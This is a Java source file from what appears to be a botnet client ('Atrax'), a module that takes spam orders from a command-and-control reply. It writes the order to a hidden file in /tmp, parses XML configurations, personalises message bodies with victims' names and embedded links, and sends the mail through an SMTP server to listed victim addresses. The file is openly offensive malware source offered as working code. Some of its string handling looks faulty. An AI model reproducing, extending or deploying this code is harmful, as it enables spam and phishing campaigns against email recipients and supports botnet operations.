/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Atrax.atrax_client_bot;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.util.ArrayList;
import java.util.Iterator;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.SAXException;

/*******************************************
 *  this class:
 *  conducts the spam, if it receives
 *  proper messages from the mailer class.
 * @author sindat
 *******************************************/
public class spamModule {
    public static void sendSpam(String CC_Reply, mailer theMailer, Boolean debug) throws SAXException, ParserConfigurationException, IOException {
        if (CC_Reply != null && CC_Reply.contains("<spam>")) {
            if (debug) {
                System.out.println("SPAM ORDER RECEIVED. MODE: " + theMailer.mode + ", SMTP SERVER: " + theMailer.smtpServer + " .");
                // write the CC_Reply to a fike
                Writer ccReplyOutput = null;
                File dest_file = new File("/tmp/.atraxSpamReport");
                try {
                    ccReplyOutput = new BufferedWriter(new FileWriter(dest_file));
                    ccReplyOutput.write(CC_Reply);
                    ccReplyOutput.close();
                } catch (IOException e) {
                }
                // process the CC_Reply 
                // extracting the config parameters for the spam messages
                // which are in XML format
                // that's when the XML parser class kicks in
                ArrayList<spamXMLparser> theSpamConfigs = new spamXMLparser().returnSpamConfigs("/tmp/.atraxSpamReport");
                Iterator<spamXMLparser> iterator0 = theSpamConfigs.iterator();
                // SEND THE SPAM!
                while (iterator0.hasNext()) {
                    spamXMLparser spam_details = new spamXMLparser();
                    spam_details = iterator0.next();
                    // adjust the body of the spam message
                    String adjustedBody = 
                            spam_details.emailBody.replaceAll("-firstName-", spam_details.victimFirstName).replaceAll("-lastName-", 
                                    spam_details.victimLastName);
                    if (adjustedBody.contains("-link-:")){
                        String linkDetails = adjustedBody.substring(adjustedBody.indexOf("-link-:")).substring(0, adjustedBody.substring(
                        adjustedBody.indexOf("-link-:")).indexOf("")).replaceAll("-link-:", "");
                        String link = linkDetails.substring(0, linkDetails.indexOf("^"));
                        String linkText = linkDetails.substring(linkDetails.indexOf("^") + 1);
                        adjustedBody = adjustedBody.substring(0, adjustedBody.indexOf("-link-:")) +
                                "<A HREF=\"" + link + "\">" + linkText + "</A>" + 
                                    adjustedBody.substring(adjustedBody.indexOf("-link-:") + linkDetails.length() + 7);
                    }
                    if (debug) {
                        System.out.println("    Sending spam to addr: " + spam_details.victimAddress);
                        mailer.spamMessages(theMailer.smtpServer, 25, spam_details.emailSubject, spam_details.emailFromAddress,
                                spam_details.victimAddress, adjustedBody);
                    }
                }
            }
        }
    }
}
